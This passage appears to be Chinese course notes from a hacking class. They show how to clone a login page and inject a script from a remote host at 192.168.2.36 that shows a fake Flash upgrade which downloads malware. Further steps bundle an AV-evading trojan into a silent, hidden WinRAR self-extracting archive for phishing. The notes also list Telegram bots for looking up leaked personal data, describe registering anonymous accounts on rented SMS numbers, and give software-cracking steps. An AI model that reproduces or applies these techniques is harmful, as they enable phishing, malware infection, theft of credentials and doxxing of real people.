+<h3 id="3、准备一个高仿页面这里我用一个登录页面作为例子"><a href="#3、准备一个高仿页面这里我用一个登录页面作为例子" class="headerlink" title="3、准备一个高仿页面这里我用一个登录页面作为例子"></a>3、准备一个高仿页面<br />这里我用一个登录页面作为例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;登录页面&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        /* 添加更漂亮的样式 */</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: <span class="string">&#x27;Segoe UI&#x27;</span>, Tahoma, Geneva, Verdana, sans-serif;</span><br><span class="line">            background-image: linear-gradient(to right, <span class="comment">#4568DC, #B06AB3);</span></span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .login-container &#123;</span><br><span class="line">            background-color: white;</span><br><span class="line">            padding: 40px;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">0</span> 20px rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">            width: 350px;</span><br><span class="line">        &#125;</span><br><span class="line">        h1 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            margin-bottom: 30px;</span><br><span class="line">            color: <span class="comment">#4568DC;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">input</span> &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: 12px;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            background-color: <span class="comment">#f2f2f2;</span></span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line">        button &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: 12px;</span><br><span class="line">            background-image: linear-gradient(to right, <span class="comment">#4568DC, #B06AB3);</span></span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line">        button:hover &#123;</span><br><span class="line">            opacity: <span class="number">0.9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;欢迎登录&lt;/h1&gt;</span><br><span class="line">        &lt;form&gt;</span><br><span class="line">            &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;用户名&quot;</span> required&gt;</span><br><span class="line">            &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;密码&quot;</span> required&gt;</span><br><span class="line">            &lt;button <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a name="sYfOz"></a></p>
+<h3 id="4、在页面中插入我们的js链接插入在login-php-以后基本都用php后缀来上课使用-html自行研究"><a href="#4、在页面中插入我们的js链接插入在login-php-以后基本都用php后缀来上课使用-html自行研究" class="headerlink" title="4、在页面中插入我们的js链接&lt;script src=&quot;flash.js&quot;&gt;&lt;/script&gt;插入在login.php(以后基本都用php后缀来上课使用    (html自行研究))"></a>4、在页面中插入我们的js链接<br /><code>&lt;script src=&quot;flash.js&quot;&gt;&lt;/script&gt;</code>插入在login.php(以后基本都用php后缀来上课使用    (html自行研究))</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;登录页面&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        /* 添加更漂亮的样式 */</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: <span class="string">&#x27;Segoe UI&#x27;</span>, Tahoma, Geneva, Verdana, sans-serif;</span><br><span class="line">            background-image: linear-gradient(to right, <span class="comment">#4568DC, #B06AB3);</span></span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .login-container &#123;</span><br><span class="line">            background-color: white;</span><br><span class="line">            padding: 40px;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">0</span> 20px rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">            width: 350px;</span><br><span class="line">        &#125;</span><br><span class="line">        h1 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            margin-bottom: 30px;</span><br><span class="line">            color: <span class="comment">#4568DC;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">input</span> &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: 12px;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            background-color: <span class="comment">#f2f2f2;</span></span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line">        button &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: 12px;</span><br><span class="line">            background-image: linear-gradient(to right, <span class="comment">#4568DC, #B06AB3);</span></span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line">        button:hover &#123;</span><br><span class="line">            opacity: <span class="number">0.9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://192.168.2.36/2/flash.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;欢迎登录&lt;/h1&gt;</span><br><span class="line">        &lt;form&gt;</span><br><span class="line">            &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;用户名&quot;</span> required&gt;</span><br><span class="line">            &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;密码&quot;</span> required&gt;</span><br><span class="line">            &lt;button <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://192.168.2.36/2/flash.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a name="BK2Xi"></a></p>
+<h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><p><a name="LGWoC"></a></p>
+<h3 id="5、尝试访问"><a href="#5、尝试访问" class="headerlink" title="5、尝试访问"></a>5、尝试访问<br /><br /></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/26698826/1714218827877-dfd8045e-d899-4808-b148-301f927f94d4.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_39,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp/resize,w_1237,limit_0#averageHue=%23404977&from=url&id=gMLuy&originHeight=1194&originWidth=1237&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>点击立即升级会下载恶意文件<br />若是想要解决自己制作页面就要找到相应的代码改进<br />在flash的文档的里是为了打开网页后进行点击进行跳转的设置onclick&#x3D;window.location.href&#x3D;’calc.exe’&gt;</div></div></div>“在下划线进行更改。<br />在login.php里的文件里弄这个跳转，然后再进行更改代码。</p>
+<p><a name="UaY0U"></a></p>
+<h2 id="13、-自解压捆绑木马"><a href="#13、-自解压捆绑木马" class="headerlink" title="13、 自解压捆绑木马"></a>13、 自解压捆绑木马</h2><p><a name="OL67K"></a></p>
+<h3 id="1、自解压捆绑木马"><a href="#1、自解压捆绑木马" class="headerlink" title="1、自解压捆绑木马"></a>1、自解压捆绑木马</h3><p><br />1.生成个马并免杀<br />2.自解压文件生成<br />a.将flash与马放到同一文件<br />b.使用winrar创建压缩文件 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26698826/1667955534381-19671bf8-02ee-417e-a635-c250ab4a8769.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_15,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23eeeeed&from=url&id=kyjmj&originHeight=522&originWidth=525&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>c.高级-&gt;高级自解压选项，路径设置 C:\windows\temp <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26698826/1667955673698-5da4a2a2-1dd3-4832-8c69-949d8ac775a1.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_14,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23f7f6f6&from=url&id=ftCUV&originHeight=292&originWidth=497&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>d.设置添加 C:\windows\temp\flashcenter_pp_ax_install_cn.exe C:\windows\temp\flash.exe<br />e<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26698826/1667955751119-c6139afd-f751-45bc-996f-4732310952b3.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_15,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23f6f6f6&from=url&id=huNRk&originHeight=638&originWidth=540&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>f. 模式设置全部隐藏 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26698826/1667955844728-d6c6f46c-3e2b-483f-b8e8-f4534e25ebee.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_12,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23f6f5f5&from=url&id=UtaLE&originHeight=391&originWidth=433&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>g. 更新设置 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26698826/1667955880117-b4557a7b-86a0-4881-9d00-cb7966fb97e0.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_14,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23f5f5f4&from=url&id=Hcukl&originHeight=391&originWidth=482&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>h.生成<br />3.替换图标<br />a.1<br />4.钓鱼<br><a name="EnlkM"></a></p>
+<h2 id="14、虚拟账号的购买telegram"><a href="#14、虚拟账号的购买telegram" class="headerlink" title="14、虚拟账号的购买telegram"></a>14、虚拟账号的购买telegram</h2><p><a name="W59R2"></a></p>
+<h3 id="1、TG社工库"><a href="#1、TG社工库" class="headerlink" title="1、TG社工库"></a>1、TG社工库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">您的专属邀请链接:https://t.me/AJL01_bot?start=C9uZSsbKX1</span><br><span class="line">社工庫机器人: t.me/aishegongkubot?start=AISGK_HBEIR85X</span><br><span class="line">https://t.me/DATA_007bot?start=<span class="number">8989324940</span></span><br><span class="line">https://t.me/pingansgk_bot?start=ee95c5680f</span><br><span class="line">https://t.me/JokerSGKbot?start=87OE61VQ</span><br><span class="line">https://t.me/PyramidNetBot?start=pRg3K08</span><br><span class="line">https://t.me/XingDun2Bot?start=4eoHoLE</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a name="kDWYD"></a></p>
+<h3 id="2、tg注册-2023-11-27"><a href="#2、tg注册-2023-11-27" class="headerlink" title="2、tg注册(2023&#x2F;11&#x2F;27)"></a>2、tg注册(2023&#x2F;11&#x2F;27)</h3><p><a name="TLzrM"></a></p>
+<h4 id="1、方法1（建议这个）"><a href="#1、方法1（建议这个）" class="headerlink" title="1、方法1（建议这个）"></a>1、方法1（建议这个）</h4><ol>
+<li>注册并充值<a target="_blank" rel="noopener" href="https://sms-activate.org/cn">sms</a></li>
+<li>手机挂代理，并打开tg</li>
+<li>手机tg输入sms手机号</li>
+<li>输入sms平台接收的验证码，手机成功登录</li>
+<li>手机扫码登录电脑TG</li>
+<li><code>tg://setlanguage?lang=classic-zh-cn</code>设置中文<br><a name="ChdLI"></a></li>
+</ol>
+<h4 id="2、方法2-高成功率"><a href="#2、方法2-高成功率" class="headerlink" title="2、方法2(高成功率)"></a>2、方法2(高成功率)</h4><ol>
+<li>注册并充值<a target="_blank" rel="noopener" href="https://sms-activate.org/cn">sms</a></li>
+<li>在手机<code>play商店</code>中下载<code>telegram X</code></li>
+<li>手机挂代理，并打开刚刚下载的<code>telegram X</code>，使用sms平台的手机号</li>
+<li>接收验证码即可</li>
+</ol>
+<p>1</p>
+<p><a name="JeWxV"></a></p>
+<h2 id="1、cmd的注意事项-1"><a href="#1、cmd的注意事项-1" class="headerlink" title="1、cmd的注意事项"></a>1、cmd的注意事项</h2><p>在这里就用cmd时用窗口可直接使用如图下图就不用从win加r里敲这个路径了<br />在这里就用cmd时用窗口可直接使用如图下图就不用从win加r里敲这个路径了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608406562-a2ede100-dcee-404a-bffe-dedaa03d1920.png#averageHue=%23f1f1f1&id=Rb0kz&originHeight=83&originWidth=803&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608406797-cce7db1b-0518-4c9d-b32f-5e08254d0e0b.png#averageHue=%231d1d1d&id=cDLAf&originHeight=104&originWidth=603&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p><a name="YcXMp"></a></p>
+<h2 id="2、ai的codeium的使用-1"><a href="#2、ai的codeium的使用-1" class="headerlink" title="2、ai的codeium的使用"></a>2、ai的codeium的使用</h2><p>在使用ai的时候需要打开这个软件用edge使用扩展来连老师的IP地址然后使用老师的原理是老师花钱买的一个可以来链接到国外的ip通过老师这个节点我们来使用al<br />如下图<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608406999-afc08612-a024-4786-969c-333fc32a33cd.png#averageHue=%2321201f&id=uF7NF&originHeight=182&originWidth=391&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608407148-4eee74c4-ece2-4e0d-ba8b-57d53690629e.png#averageHue=%23f5f5f5&id=OfZaZ&originHeight=139&originWidth=1324&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608407349-bd005ad6-7f2c-4a29-9ae1-8d0375745650.png#averageHue=%23f6f6f6&id=aNdAK&originHeight=92&originWidth=513&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="VKOqj"></a></p>
+<h2 id="3、软件下载的方法补充-1"><a href="#3、软件下载的方法补充-1" class="headerlink" title="3、软件下载的方法补充"></a>3、软件下载的方法补充</h2><p>phpstudy<br />建议安装路径不要修改，默认安装在D盘<br />java22<br />记得选择安装路径，要求安装路径记得<br />python3.9</p>
+<ol>
+<li>加入path，自定义安装</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608407591-8148aa12-2b4f-43c4-881b-f1ef6cebb4f2.png#averageHue=%23f9f7ef&id=UNdfY&originHeight=506&originWidth=820&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>全勾</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608407859-6c6874f7-f8bb-43ce-a710-04ec3b3abed1.png#averageHue=%23f9f7f2&id=iqgcT&originHeight=502&originWidth=816&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>前四个全勾，并选择安装位置</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608408147-037cfa43-7a6b-4359-a684-7db69cff5b0c.png#averageHue=%23f8f6f0&id=uGK5P&originHeight=505&originWidth=812&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>打开系统环境变量<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608408420-0174f679-6eff-410f-bd30-2d6454ee168d.png#averageHue=%23f6f5f4&id=ZrRsO&originHeight=785&originWidth=829&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608408613-639d629d-4295-40d6-9a1d-a1f346f8fd95.png#averageHue=%23f6f5f3&id=GJmIP&originHeight=596&originWidth=1269&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>将python加入系统环境变量(复制粘贴)<img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608408885-6a3fe541-8781-4173-9837-35aaa5ec1b1d.png#averageHue=%23f5f3f3&id=X2YQG&originHeight=664&originWidth=671&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>确定，确定，重启电脑</li>
+</ol>
+<p>IDEA</p>
+<ol>
+<li>选择路径安装idea，全勾<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608409029-719ab6c2-529f-4812-8657-c91ac1c2673f.png#averageHue=%23eeeded&id=eXjZw&originHeight=538&originWidth=747&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>安装完成,关闭idea，以管理员身份运行激活包<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608409220-32778f7e-bf1f-4ffd-9433-7205dccfb5be.png#averageHue=%23faf9f8&id=ihuGD&originHeight=746&originWidth=838&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>激活完毕，重启电脑</li>
+<li>输入激活码</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608409510-75adfba9-7578-42e7-a0d1-58ea6dee97c8.png#averageHue=%2330353b&id=oC09V&originHeight=667&originWidth=1087&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />bandzip(解压软件)</p>
+<ol>
+<li>正常安装，记得选择安装路径<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608409766-ab529bc3-c155-43ff-b097-c7da53555202.png#averageHue=%23faf8f7&id=VkLzi&originHeight=124&originWidth=641&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>破解</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608409976-c11fa210-5f7e-4006-9f13-13d83dff4a50.png#averageHue=%23faf9f7&id=Ss0pr&originHeight=630&originWidth=1270&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>去广告，选项-设置<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608410277-d5ee92ca-9699-4b7a-9747-c4b428610a01.png#averageHue=%23c2bb4a&id=jfkdn&originHeight=937&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+</ol>
+<p>vscode插件</p>
+<ol>
+<li>codeium<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608410498-a91ad0d5-c0bf-4045-9b57-4ef4f4b152ec.png#averageHue=%232a5957&id=lORTx&originHeight=90&originWidth=93&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>chinese<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608410653-e89e5e4f-5ec5-4477-9feb-d9844b91dae5.png#averageHue=%23252a31&id=hsNyX&originHeight=94&originWidth=634&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>code runner<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608410831-bd1ea3ff-a36f-4922-b2e6-74ef260ec2c8.png#averageHue=%232f343e&id=v5ZfP&originHeight=84&originWidth=845&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>ctrl+滚轮(调节字体大小)(需要设置)<br />待补充</li>
+</ol>
+<p>注：</p>
+<ol>
+<li>安装路径不要有中文</li>
+<li>最好不装在C盘</li>
+<li>安装路径不要有空格和符号(_除外)<br><a name="5UJj8"></a></li>
+</ol>
+<h2 id="4、虚拟机的使用-1"><a href="#4、虚拟机的使用-1" class="headerlink" title="4、虚拟机的使用"></a>4、虚拟机的使用</h2><p>在文件里找到文件所在位置后缀名为vmx的用VMware选定<br />我的widow10装在了G盘里的kail<br />我的kali装在了D盘里的kail，且里面还有2个镜像；<br />在使用虚拟机的时候滑轮和小键盘的数字键码不可以乱按容易乱码<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411069-a4d5cd40-5aaa-4cb1-9967-e6597d11506a.png#averageHue=%23f9f5f1&id=eIluG&originHeight=79&originWidth=80&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />虚拟机没网<img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411284-2c294439-0de0-4ec0-9a9c-3ee88e3ef04c.png#averageHue=%23f7f6f5&id=r2fKT&originHeight=491&originWidth=1061&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />改成nqt<br />如果还没有网络<img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411434-969e896f-9b56-4d76-b65f-beceb36ff048.png#averageHue=%23f0eeed&id=mHWjU&originHeight=157&originWidth=270&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />Jiu<br><a name="8iS0n"></a></p>
+<h2 id="5、重装系统-1"><a href="#5、重装系统-1" class="headerlink" title="5、重装系统"></a>5、重装系统</h2><p>在重装系统的时候要把下图全关闭，但以下图这个会容易几分钟自动检测重启，在激活系统前必做的事情<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411584-3d46a5fd-d175-43bb-b60c-13f74759f5f7.png#averageHue=%23f3f3f3&id=tqvuz&originHeight=304&originWidth=506&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="Aotog"></a></p>
+<h2 id="6-代理的购买与应用-1"><a href="#6-代理的购买与应用-1" class="headerlink" title="6 代理的购买与应用"></a>6 代理的购买与应用</h2><ol start="2">
+<li><p>购买代理</p>
+</li>
+<li><p>登录并注册账户<a target="_blank" rel="noopener" href="https://console.xenolink.net/#/register?code=vocvktBL">https://console.xenolink.net/#/register?code=vocvktBL</a><br /><a target="_blank" rel="noopener" href="https://console3.xenolk.com/#/register?code=vocvktBL">https://console3.xenolk.com/#/register?code=vocvktBL</a></p>
+</li>
+<li><p>选择第一个套餐</p>
+</li>
+<li><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411769-1f1c6349-6955-4f75-91dd-876eeba316d0.png#averageHue=%23e7eae8&id=cu6FP&originHeight=470&originWidth=402&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+</li>
+<li><p>付款</p>
+</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411986-67f30933-5cfd-4bd4-9a7f-e050e4550d26.png#averageHue=%23f2f1ec&id=WbyHO&originHeight=475&originWidth=643&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>复制订阅<ol>
